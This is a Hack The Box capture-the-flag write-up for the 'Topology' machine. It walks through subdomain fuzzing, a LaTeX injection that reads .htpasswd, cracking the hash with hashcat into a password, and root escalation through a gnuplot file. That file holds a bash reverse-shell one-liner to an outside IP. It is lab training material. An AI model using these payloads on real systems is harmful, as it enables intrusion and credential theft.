---
title: "Hack The Box - Topology [Easy]"
date: 2023-06-30T10:42:27+03:00
draft: false
tags: ["hackthebox"]
---

I've started with simple machine enumeration

```bash
$ nmap -sV 10.10.11.217
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Then I went to `topology.htb` to check out the website, noticed the possible users (according to the email that is formatted like `lklein@topology.htb`). I've enumerated possible users:

```
lklein
vdaisley
dabrahams
```

I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website. There I found out some LaTeX to PNG convertor. I've figured out that there must be some trickery with this so I went my way to research the topic. 

I've found out the following:
- https://0day.work/hacking-with-latex/
- https://salmonsec.com/cheatsheets/exploitation/latex_injection

These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as `/etc/passwd, /proc/self/cmdline, /proc/self/environ` and so on, I've figured out that I must be missing something. I began to explore what other subdomains (because there is `latex.topology.htb` I thought there would be more) were on the webserver using `ffuf`.

```bash
$ ffuf -w $commontxt -u http://topology.htb/ -H "Host: FUZZ.topology.htb" -r
```

Which yielded the following domains:

- `dev`
- `stats`

I've browsed through those and on the stats there were simple plots about the current usage of the system and that's it. But on the `dev` subdomain there was a Basic Auth in place which I then figured out that I can read the `.htpasswd` with the LFI vulnerability in the `latex.topology.htb` input form. 

I've tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what's going on. 

I honestly didn't know how can I read the file and I turned out to some help, which I then understood that I can use the `LaTeX/Source Code Listings` which also can read a file with `\lstinputlisting{/var/www/dev/.htpasswd}`, however the website just resulted in no image (possible error) using just this command. 

Here comes this post to the rescue https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and

Since the website is about math, we can use the `inline math delimiters` that are `$ and $` which can turn my payload from `\lstinputlisting{/var/www/dev/.htpasswd}` to `$\lstinputlisting{/var/www/dev/.htpasswd}$` which resulted into getting the basic auth hash.

```
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0
```

Using `hashcat` we can extract the password

```
$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn
```

With that, I tried the users that I've enumerated earlier and the user `vdaisley` worked out, so I went to log in with SSH and got the user flag.


# Root

The root was pretty easy, first we can see which directories are writable:

```
$ find / -type d -writable 2>/dev/null
...
/opt/gnuplot
...
```

This directory looked suspicious, I've fired up `pspy` to checkout what is going on and I got this:

![rwojak](/htb/htb-topology-pspyrun.png)

So we are finding `*.plt` files in this directory, and then we are executing `gnuplot` as root. Using this [article,](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/#command-execution) I've crafted a `test.plt` file with the contents of:

```bash
vdaisley@topology:/opt/gnuplot$ cat ~/test.plt 
system "bash -c 'bash -i >& /dev/tcp/10.10.16.xx/4444 0>&1'"
```

I've copied the file to the `/opt/gnuplot` directory and I've waited to get a remote connection which I got in about a minute. With that I rooted the machine.
